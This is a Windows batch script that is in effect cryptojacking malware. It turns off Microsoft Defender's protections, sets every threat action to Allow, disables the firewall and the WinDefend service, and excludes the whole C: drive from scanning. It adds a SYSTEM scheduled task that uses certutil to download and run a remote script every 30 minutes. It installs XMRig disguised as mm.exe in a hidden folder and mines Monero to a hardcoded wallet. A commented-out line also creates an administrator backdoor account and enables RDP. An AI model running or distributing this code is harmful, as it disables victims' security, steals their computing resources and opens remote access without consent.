@echo off

powershell -c "Set-MpPreference -DisableBehaviorMonitoring $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableArchiveScanning $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableDatagramProcessing $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableDnsOverTcpParsing  $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableDnsParsing         $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableEmailScanning      $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableFtpParsing         $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableGradualRelease     $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableHttpParsing        $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableInboundConnectionFiltering $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableIOAVProtection     $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableNetworkProtectionPerfTelemetry $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisablePrivacyMode        $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableRdpParsing         $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableRemovableDriveScanning $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableRestorePoint       $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan  $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableScanningNetworkFiles $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableScriptScanning     $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableSshParsing         $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableTDTFeature         $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableTlsParsing         $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableBlockAtFirstSeen $True -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -DisableIntrusionPreventionSystem $True -ErrorAction SilentlyContinue"


powershell -c "Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue"
powershell -c "Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue"


powershell -c "netsh advfirewall set all state off"

powershell -c "sc stop WinDefend"

powershell -c "sc config WinDefend start= disabled"

powershell -c "New-Item -ItemType Directory -Force -Path C:\windows\system32\MDSN"
powershell -c "New-Item -ItemType Directory -Force -Path C:\ProgramData\MDSN"

powershell -c "Set-MpPreference -PUAProtection 0"

powershell -c "Add-MpPreference -ExclusionPath 'C:\'"
powershell -c "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
powershell -c "Add-MpPreference -ExclusionPath 'C:\windows\system32\MDSN'"
powershell -c "Set-MpPreference -ExclusionProcess 'explorer.exe', 'cmd.exe','mm.exe','powershell.exe','svchost.exe','scvhost.exe'"

powershell -c "New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"


schtasks /query /TN "mmWin" >NUL 2>&1 || schtasks /create /RL HIGHEST /RU "NT AUTHORITY\SYSTEM" /sc minute /mo 30 /tn "mmWin" /tr "cmd.exe /C certutil.exe -urlcache -f http://github.com/autominion-wx.cmd %systemdrive%\\Windows\\Temp\\autominion-wx.cmd & %systemdrive%\\Windows\\Temp\\autominion-wx.cmd"

if exist %systemdrive%\Windows\Temp\WinSVC\ (
  echo Yes 
  if exist %systemdrive%\Windows\Temp\WinSVC\mm.exe (
    echo Yes 
    ) else (
      rmdir /s %systemdrive%\Windows\Temp\WinSVC
      rmdir /s %systemdrive%\\Windows\\Temp\\xmrig-6.18.0
    )
) else (
    echo No
    powershell -c "[Net.ServicePointManager]::SecurityProtocol = 'Tls, Tls11, Tls12, Ssl3'; Invoke-WebRequest -Uri 'https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-msvc-win64.zip' -OutFile '%systemdrive%\\Windows\\Temp\\xmrig-6.18.0-msvc-win64.zip'"
    powershell -c "Expand-Archive -Force '%systemdrive%\\Windows\\Temp\\xmrig-6.18.0-msvc-win64.zip' '%systemdrive%\\Windows\\Temp'"
    powershell -c "Rename-Item '%systemdrive%\\Windows\\Temp\\xmrig-6.18.0' '%systemdrive%\\Windows\\Temp\\WinSVC'"
    powershell -c "Rename-Item '%systemdrive%\\Windows\\Temp\\WinSVC\\xmrig.exe' '%systemdrive%\\Windows\\Temp\\WinSVC\\mm.exe'"
    
    if exist %systemdrive%\Windows\Temp\WinSVC\ (
    echo Yes 
    ) else (
      powershell -c "[System.Reflection.Assembly]::LoadWithPartialName(\"System.IO.Compression.FileSystem\") | Out-Null; $pathToZip='%systemdrive%\Windows\Temp\xmrig-6.18.0-msvc-win64.zip'; $targetDir='%systemdrive%\Windows\Temp'; [System.IO.Compression.ZipFile]::ExtractToDirectory($pathToZip, $targetDir)"
      powershell -c "Rename-Item '%systemdrive%\\Windows\\Temp\\xmrig-6.18.0' '%systemdrive%\\Windows\\Temp\\WinSVC'"
      powershell -c "Rename-Item '%systemdrive%\\Windows\\Temp\\WinSVC\\xmrig.exe' '%systemdrive%\\Windows\\Temp\\WinSVC\\mm.exe'"
    )
    
    
    powershell -c "Get-Item '%systemdrive%\\Windows\\Temp\\WinSVC' -Force | foreach { $_.Attributes = $_.Attributes -bor 'Hidden' }"
)

FOR /F "tokens=* USEBACKQ" %%F IN (`"hostname"`) DO (
SET host=%%F
)
ECHO %host%

FOR /F "tokens=* USEBACKQ" %%F IN (`powershell -c "(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb"`) DO (
SET mem=%%F
)
ECHO %mem%


FOR /F "tokens=* USEBACKQ" %%F IN (`powershell -c "(Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors"`) DO (
SET cpu=%%F
)
ECHO %cpu%

set name=%host%.%mem%GB.%cpu%CPU
echo %name%

SETLOCAL EnableExtensions
set EXE=mm.exe
FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF NOT %%x == %EXE% (
  echo %EXE% is Not Running
  %systemdrive%\Windows\Temp\WinSVC\mm.exe -o xmrpool.eu:9999 -u 41zgTNW4Z9FiTorttLakhJ8HFN77CXeFw1NNMHa48oqPZZFwrEc6JNj3bDaihgdzmuXDcKZeJhRfBAEAcSeT41hs9cvCMNR -k --tls --rig-id %name% --randomx-1gb-pages --background
)

:: rdp add (aggresive)

::powershell -c "net user javagui qwertyC3$1236! /add & net localgroup administrators javagui /add & net localgroup 'Remote Desktop Users(variable)' javagui /add & reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 'Remote Desktop' & netsh firewall set service remoteadmin enable"
